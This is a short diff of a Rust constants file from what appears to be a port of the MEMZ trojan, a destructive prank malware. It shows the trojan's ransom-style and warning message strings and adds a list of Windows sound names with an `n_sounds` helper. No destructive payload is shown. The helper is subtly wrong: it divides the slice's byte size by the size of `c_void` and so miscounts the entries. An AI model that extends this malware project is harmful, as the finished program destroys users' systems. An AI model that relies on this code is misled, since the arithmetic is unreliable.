@@ -1,3 +1,8 @@
+use std::{
+    ffi::c_void,
+    mem::{size_of, size_of_val},
+};
+
 pub const MSG: &str = "YOUR COMPUTER HAS BEEN FUCKED BY THE MEMZ TROJAN.\r\n\r\nYour computer won't boot up again,\r\nso use it as long as you can!\r\n\r\n:D\r\n\r\nTrying to kill MEMZ will cause your system to be\r\ndestroyed instantly, so don't try it :D";
 pub const MSG_LEN: usize = MSG.len();
 
@@ -41,3 +46,9 @@ DO YOU WANT TO EXECUTE THIS MALWARE, RESULTING IN AN UNUSABLE MACHINE?";
 pub const MEMZ_MSGBOXA_2: &str = "THIS IS THE LAST WARNING!\r\n\r\n\
 THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE MADE USING THIS MALWARE!\r\n\
 STILL EXECUTE IT?";
+
+pub const SOUNDS: &[&str] = &["SystemHand", "SystemQuestion", "SystemExclamation"];
+
+pub fn n_sounds() -> usize {
+    size_of_val(SOUNDS) / size_of::<c_void>()
+}
